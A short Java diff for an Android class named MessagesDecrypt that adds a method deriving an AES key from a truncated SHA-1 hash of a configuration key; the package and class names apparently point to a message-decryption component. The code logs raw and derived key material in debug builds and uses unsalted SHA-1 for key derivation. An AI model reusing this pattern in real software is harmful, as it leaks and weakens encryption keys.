@@ -16,6 +16,7 @@ import javax.crypto.spec.SecretKeySpec;
 import android.content.Context;
 
 import com.android.dvci.auto.Cfg;
+import com.android.dvci.crypto.Keys;
 import com.android.dvci.util.ByteArray;
 import com.android.dvci.util.Check;
 import com.android.dvci.util.Utils;
@@ -136,7 +137,43 @@ public class MessagesDecrypt {
 
 	}
 
+	public static SecretKey produceKeySimple() {
+		try {
+
+			byte[] key = Keys.self().getConfKey();
+			if (Cfg.DEBUG) {
+				Check.log(" key: " + key + " " + key.length); //$NON-NLS-1$
+			}
+
+			final MessageDigest digest = MessageDigest.getInstance("SHA-1");
+			digest.update(key);
+
+			final byte[] sha1 = digest.digest();
+
+			final byte[] aes_key = new byte[16];
+			System.arraycopy(sha1, 0, aes_key, 0, aes_key.length);
+
+			final SecretKey secret = new SecretKeySpec(aes_key, "AES");
+			if (Cfg.DEBUG) {
+				Check.log(" produced key: " + ByteArray.byteArrayToHex(aes_key)); //$NON-NLS-1$
+			}
+
+			return secret;
+		} catch (final Exception e) {
+			if (Cfg.EXCEPTION) {
+				Check.log(e);
+			}
+
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " " + e); //$NON-NLS-1$
+			}
+
+			return null;
+		}
+	}
+
 	public HashMap<String, String> getMessages() {
 		return messages;
 	}
+
 }
